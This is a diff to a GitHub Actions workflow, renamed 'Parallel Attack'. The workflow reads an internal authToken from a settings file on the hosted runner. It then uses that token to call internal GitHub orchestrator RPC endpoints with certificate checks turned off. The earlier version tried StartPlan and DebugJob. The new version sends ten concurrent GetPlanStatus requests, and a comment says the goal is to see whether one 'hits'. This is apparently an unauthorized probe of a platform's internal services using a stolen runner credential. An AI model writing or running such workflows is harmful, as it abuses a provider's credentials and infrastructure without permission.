@@ -1,4 +1,4 @@
-name: Final Compare
+name: Parallel Attack
 on:
   push:
     branches: [master]
@@ -11,25 +11,16 @@ jobs:
           TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
           BASE="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
           
-          echo "=== GetPlanStatus (known to work) ==="
-          curl -sk --http2 --connect-timeout 10 \
-            -H "Authorization: Bearer $TOK" \
-            -H "Content-Type: application/json" \
-            -d '{}' \
-            "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1
-          
+          # 并发10次请求，看有没有一次能命中
+          echo "=== Parallel x10 ==="
+          for i in 1 2 3 4 5 6 7 8 9 10; do
+            curl -sk --http2 --connect-timeout 5 \
+              -H "Authorization: Bearer $TOK" \
+              -H "Content-Type: application/json" \
+              -H "X-GitHub-Test: $i" \
+              -d '{}' \
+              "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1 &
+          done
+          wait
           echo ""
-          echo "=== StartPlan ==="
-          curl -sk --http2 --connect-timeout 10 \
-            -H "Authorization: Bearer $TOK" \
-            -H "Content-Type: application/json" \
-            -d '{}' \
-            "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan" 2>&1
-          
-          echo ""
-          echo "=== DebugJob ==="
-          curl -sk --http2 --connect-timeout 10 \
-            -H "Authorization: Bearer $TOK" \
-            -H "Content-Type: application/json" \
-            -d '{}' \
-            "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob" 2>&1
+          echo "=== Done ==="
